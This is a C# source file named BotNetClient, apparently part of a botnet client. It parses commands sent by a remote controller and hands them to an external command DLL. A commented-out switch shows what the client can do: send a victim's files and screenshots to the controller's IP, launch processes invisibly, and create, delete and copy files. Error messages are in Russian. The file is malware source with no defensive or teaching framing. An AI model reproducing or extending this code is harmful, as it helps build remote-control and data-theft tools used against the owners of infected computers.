using System;
using System.Runtime.InteropServices;

namespace BotNetClient
{
    class handler
    {
        [DllImport(@"C:\Users\Павел\source\repos\BotNet\BotNetClient\BotNetClient\bin\Debug\CommandHandler.dll", EntryPoint = "Main", CharSet = CharSet.Auto)]
        public static extern string Main(string cmd, string path1, string path2, string ip, uint idc);
        public static string handl(string message, uint id, string ip)
        {
            string a = null;
            string[] msg = new string[3];
            string[] msg1 = message.Split(new char[] { '^' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < msg1.Length; i++)
            {
                msg[i] = msg1[i];
            }
            if (msg[2] == null)
            {
                msg[2] = "null";
            }
            if (msg[0].StartsWith("/"))
            {
                msg[0] = msg[0].Remove(0, 1);
            }
            else
            {
                return "Команда не распознана";
            }
            a = CommandHandler.Class1.Main(msg[0], msg[1], msg[2], ip, id);
            #region switch
            //switch (msg[0])
            //{
            //    case "getfile":
            //        string path = HttpHandler.Class1.SendFilePathAsync(ip).Result;
            //        HttpHandler.Class1.SendFileAsync(id, ip, path, SendOrGetFile.Class1.codeToSend(path));
            //        break;
            //    case "sendfile":
            //        SendOrGetFile.Class1.codeToGet(HttpHandler.Class1.GetFileAsync(ip).Result, HttpHandler.Class1.GetFilePathAsync(ip).Result);
            //        break;
            //    case "screen":
            //        HttpHandler.Class1.ScreenSendAsync(Program.idc.ToString(), ProcessShowingTheScreen.Class1.code());
            //        break;
            //    case "startinvis":
            //        ProcessStartInvis.Class1.code(msg[1]);
            //        break;
            //    case "nameofpc":
            //        a = NameOfPc.Class1.code();
            //        break;
            //    case "createwrite":
            //        CreateWrite.Class1.code(msg[1],msg[2]);
            //        break;
            //    case "start":
            //        ProcessStart.Class1.code(msg[1]);
            //        break;
            //    case "create":
            //        ProcessCreate.Class1.code(msg[1]);
            //        break;
            //    case "delete":
            //        ProcessDelete.Class1.code(msg[1]);
            //        break;
            //    case "copy":
            //        ProcessCopy.Class1.code(msg[1], msg[2]);
            //        break;
            //    default:
            //        return("Команда введена неверно или отсуствует у клиента");
            //}
            #endregion
            return $"Done!  {a}";
        }
    }
}
